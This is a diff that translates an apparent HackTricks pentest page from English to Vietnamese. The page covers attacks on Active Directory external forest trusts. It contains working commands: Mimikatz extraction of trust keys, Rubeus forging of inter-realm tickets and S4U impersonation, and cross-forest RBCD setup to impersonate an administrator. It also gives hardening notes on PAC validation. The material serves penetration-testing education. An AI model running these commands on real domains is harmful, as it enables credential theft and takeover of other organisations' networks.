@@ -1,12 +1,12 @@
-# External Forest Domain - OneWay (Inbound) or bidirectional
+# Domain Forest bên ngoài - OneWay (Inbound) hoặc hai chiều
 
 {{#include ../../banners/hacktricks-training.md}}
 
-In this scenario an external domain is trusting you (or both are trusting each other), so you can get some kind of access over it.
+Trong tình huống này, một domain bên ngoài tin cậy bạn (hoặc cả hai tin cậy lẫn nhau), vì vậy bạn có thể giành được một dạng quyền truy cập vào domain đó.
 
 ## Enumeration
 
-First of all, you need to **enumerate** the **trust**:
+Trước tiên, bạn cần **enumerate** **trust**:
 
 ```bash
 Get-DomainTrust
@@ -61,15 +61,15 @@ IsDomain     : True
 Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
 ```
 
-> `SelectiveAuthentication`/`SIDFiltering*` let you quickly see if cross-forest abuse paths (RBCD, SIDHistory) are likely to work without extra prerequisites.<sup>[[2]](#references)</sup>
+> `SelectiveAuthentication`/`SIDFiltering*` cho phép bạn nhanh chóng xác định liệu các đường tấn công lạm dụng cross-forest (RBCD, SIDHistory) có khả năng hoạt động mà không cần điều kiện tiên quyết bổ sung hay không.<sup>[[2]](#references)</sup>
 
-In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
+Trong quá trình enumeration trước đó, đã phát hiện người dùng **`crossuser`** thuộc nhóm **`External Admins`**, nhóm này có **quyền Admin** trên **DC của domain bên ngoài**.
 
-## Initial Access
+## Truy cập ban đầu
 
-If you **couldn't** find any **special** access of your user in the other domain, you can still go back to the AD Methodology and try to **privesc from an unprivileged user** (things like kerberoasting for example):
+Nếu bạn **không thể** tìm thấy **quyền** đặc biệt nào của người dùng mình trong domain khác, bạn vẫn có thể quay lại AD Methodology và thử **privesc từ một người dùng không có đặc quyền** (ví dụ như kerberoasting):
 
-You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
+Bạn có thể dùng **các hàm Powerview** để **enumerate** **domain khác** bằng tham số `-Domain`, như sau:
 
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
@@ -80,30 +80,30 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ./
 {{#endref}}
 
-## Impersonation
+## Mạo danh
 
-### Logging in
+### Đăng nhập
 
-Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:
+Sử dụng phương thức thông thường với thông tin xác thực của người dùng có quyền truy cập vào miền bên ngoài, bạn sẽ có thể truy cập:
 
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 
-### SID History Abuse
+### Lạm dụng SID History
 
-You could also abuse [**SID History**](sid-history-injection.md) across a forest trust.
+Bạn cũng có thể lạm dụng [**SID History**](sid-history-injection.md) qua forest trust.
 
-If a user is migrated **from one forest to another** and **SID Filtering is not enabled**, it becomes possible to **add a SID from the other forest**, and this **SID** will be **added** to the **user's token** when authenticating **across the trust**.
+Nếu người dùng được di chuyển **từ forest này sang forest khác** và **SID Filtering chưa được bật**, bạn có thể **thêm một SID từ forest kia**. SID này sẽ được **thêm** vào **token của người dùng** khi xác thực **qua trust**.
 
 > [!WARNING]
-> As a reminder, you can get the signing key with
+> Xin nhắc lại, bạn có thể lấy signing key bằng cách
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-You could **sign with** the **trusted** key a **TGT impersonating** the user of the current domain.
+Bạn có thể **ký bằng** khóa **đáng tin cậy** một **TGT giả mạo** người dùng của miền hiện tại.
 
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
@@ -116,7 +116,7 @@ Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /d
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
 
-### Full way impersonating the user
+### Cách đầy đủ để mạo danh người dùng
 
 ```bash
 # Get a TGT of the user with cross-domain permissions
@@ -132,9 +132,9 @@ Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /d
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
 
-### Cross-forest RBCD when you control a machine account in the trusting forest (no SID filtering / selective auth)
+### RBCD xuyên forest khi bạn kiểm soát một machine account trong trusting forest (không có SID filtering / selective auth)
 
-If your foreign principal (FSP) lands you in a group that can write computer objects in the trusting forest (e.g., `Account Operators`, custom provisioning group), you can configure **Resource-Based Constrained Delegation** on a target host of that forest and impersonate any user there:
+Nếu foreign principal (FSP) đưa bạn vào một group có quyền ghi các computer object trong trusting forest (ví dụ: `Account Operators`, custom provisioning group), bạn có thể cấu hình **Resource-Based Constrained Delegation** trên một target host của forest đó và impersonate bất kỳ user nào tại đó:
 
 ```bash
 # 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
@@ -147,15 +147,14 @@ Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
 Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
 ```
 
-This only works when **SelectiveAuthentication is disabled** and **SID filtering** does not strip your controlling SID. It is a fast lateral path that avoids SIDHistory forging and is often missed in trust reviews.<sup>[[2]](#references)</sup>
+Điều này chỉ hoạt động khi **SelectiveAuthentication bị tắt** và **SID filtering** không loại bỏ SID mà bạn kiểm soát. Đây là một lateral path nhanh, không cần giả mạo SIDHistory và thường bị bỏ sót khi rà soát trust.<sup>[[2]](#references)</sup>
 
-### PAC validation hardening
+### Tăng cường xác thực PAC
 
-PAC signature validation updates for **CVE-2024-26248**/**CVE-2024-29056** add signing enforcement on inter-forest tickets. In **Compatibility mode**, forged inter-realm PAC/SIDHistory/S4U paths can still work on unpatched DCs. In **Enforcement mode**, unsigned or tampered PAC data crossing a forest trust is rejected unless you also hold the target forest trust key. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) can weaken this while they remain available.<sup>[[1]](#references)</sup>
+Các bản cập nhật xác thực chữ ký PAC cho **CVE-2024-26248**/**CVE-2024-29056** bổ sung yêu cầu ký đối với ticket giữa các forest. Trong **Compatibility mode**, các đường tấn công giả mạo PAC/SIDHistory/S4U giữa các realm vẫn có thể hoạt động trên những DC chưa được vá. Trong **Enforcement mode**, dữ liệu PAC không có chữ ký hoặc đã bị sửa đổi khi đi qua forest trust sẽ bị từ chối, trừ khi bạn cũng nắm giữ khóa trust của forest đích. Các tùy chỉnh registry (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) có thể làm suy yếu cơ chế này trong thời gian chúng vẫn còn được hỗ trợ.<sup>[[1]](#references)</sup>
 
 ## References
 
-- [1] [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
-- [2] [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
-
+- [1] [Microsoft KB5037754 – Các thay đổi về xác thực PAC liên quan đến CVE-2024-26248 và CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
+- [2] [Đặc tả MS-PAC – Chi tiết về SID filtering và chuyển đổi claims](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
 {{#include ../../banners/hacktricks-training.md}}
